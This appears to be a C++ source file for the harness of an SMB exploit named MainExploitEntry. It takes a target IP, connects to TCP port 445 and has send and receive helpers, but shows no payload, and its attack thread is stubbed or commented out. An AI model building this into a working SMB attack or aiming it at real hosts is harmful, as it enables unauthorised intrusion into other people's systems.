#include "smb.h"

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "crypt32")
#define NO_INLINING

#ifdef NO_INLINING
#pragma auto_inline(off)
#endif // NO_INLINING

#ifdef _DEBUG
DWORD __stdcall dbgtests(PVOID pvip);
#endif // _DEBUG

#pragma warning(disable : 4267)
#pragma warning(disable : 4244)
#pragma warning(disable : 6387)

INT_PTR __stdcall MainExploitEntry(void)
{
	static STRING s;
	static UNICODE_STRING ipaddressarg, args;
	static HANDLE hthread;
	static DWORD dwtid, dwexitcode, argc;
	static INT_PTR status;
	ANYPOINTER p = { 0 }, argptr = { 0 }, * baseaddress = NULL;
	BUFFER tmp = { 0 }, bwsargs = { 0 };
	wchar_t* argv[2] = { NULL };
	
	InitUnicodeString(L"127.0.0.1", &args);

	*argv = GetCommandLineW();
	argv[1] = args.Buffer;

	if (GetUnsigned(&argc) >= 2)
	{
		bwsalloc(&tmp, wcslen(argv[1]) + sizeof(wchar_t));
		RtlCopyMemory(tmp.pbdata, argv[1], wcslen(argv[1]));
		if (!find_memory_pattern(&tmp, &p, L".", sizeof(wchar_t)))
			InitUnicodeString(L"127.0.0.1", &ipaddressarg);
		else
			InitUnicodeString(argv[1], &ipaddressarg);
		bwsfree(&tmp);
		p = { 0 };
	}
	else
	{
		InitUnicodeString(L"127.0.0.1", &ipaddressarg);
	}

	FreeUnicodeString(&args);
	ConvertUnicodeToString(&ipaddressarg, &s);
	FreeUnicodeString(&ipaddressarg);

#ifdef _DEBUG
	hthread = CreateThread(NULL, 0, &dbgtests, s.Buffer, 0, &dwtid);
#else
//	hthread = CreateThread(NULL, 0, , s.Buffer, 0, &dwtid);
#endif // _DEBUG

	if (isnull(hthread))
	{
		FreeString(&s);
		PutUlongPtr(&status, STATUS_INVALID_HANDLE);
		return status;
	}

	WaitForSingleObject(hthread, INFINITE);
	GetExitCodeThread(hthread, &dwexitcode);
	CloseHandle(hthread);
	FreeString(&s);

	PutUlongPtr(&status, (ULONG_PTR)GetUlong(&dwexitcode));
	return status;
}


#ifdef _DEBUG
DWORD __stdcall dbgtests(PVOID pvip)
{
	return 0;
}
#endif // _DEBUG

unsigned int TargetConnect(SOCKET& s, sockaddr_in& sa, WSAData& wsa, const char* targetip, unsigned int& status)
{
	typedef unsigned long(__stdcall* PFN_INET_ADDR)(const char* ip);
	s = NULL;
	sa = { 0 };
	wsa = { 0 };
	status = 0;
	HMODULE wsockdll = NULL;
	PFN_INET_ADDR pinet_addr = NULL;

	status = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (status != 0)
		return MAKEUNSIGNED(WSAGetLastError());

	if (notnull(GetModuleHandleW(TEXT("ws2_32"))))
	{
		wsockdll = GetModuleHandleW(TEXT("ws2_32"));
	}
	else
	{
		wsockdll = LoadLibraryW(TEXT("ws2_32.dll"));
	}

	if (isnull(wsockdll))
		return STATUS_INVALID_HANDLE;
	else
		pinet_addr = (PFN_INET_ADDR)GetProcAddress(wsockdll, "inet_addr");

	if (isnull(pinet_addr))
		ExitProcess(STATUS_INVALID_HANDLE);
	else
		sa.sin_addr.s_addr = pinet_addr(targetip);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(445);

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (validsock(s))
	{
		status = connect(s, (sockaddr*)&sa, sizeof(sa));
		if (issockerr(status))
		{
#ifdef _DEBUG
			fwprintf_s(stderr, TEXT("[%ws]:\t error 0x%08x occured when calling \"%ws\"\n"), __FUNCTIONW__, STATUS_FAIL, L"connect()");
			(VOID)SleepEx(2000, FALSE);
			ExitProcess(STATUS_FAIL);
#else
			return MAKEUNSIGNED(STATUS_FAIL);
#endif	//_DEBUG
		}
		else
		{
			*(&status) &= 0;
			status = 0;
			return 0;
		}

	}
	else
	{
		return MAKEUNSIGNED(WSAGetLastError());
	}

	return STATUS_FAIL;

}

unsigned int SendData(BUFFER IN OUT* bws, SOCKET& s, unsigned int& status)
{
	status = 0;

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = send(s, (const char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}

unsigned int RecvData(BUFFER IN OUT* bws, DWORD IN bufsize, SOCKET& s, unsigned int& status)
{
	bwsalloc(bws, bufsize);

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = recv(s, (char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}

unsigned int CloseAndClearSocket(SOCKET IN OUT& sfd, BOOLEAN IN WSAClean)
{
	unsigned status = 0;
	if (validsock(sfd))
		*(int *)(&status) = closesocket(sfd);
	sfd = 0;
	if (WSAClean)
		WSACleanup();
	return status;
}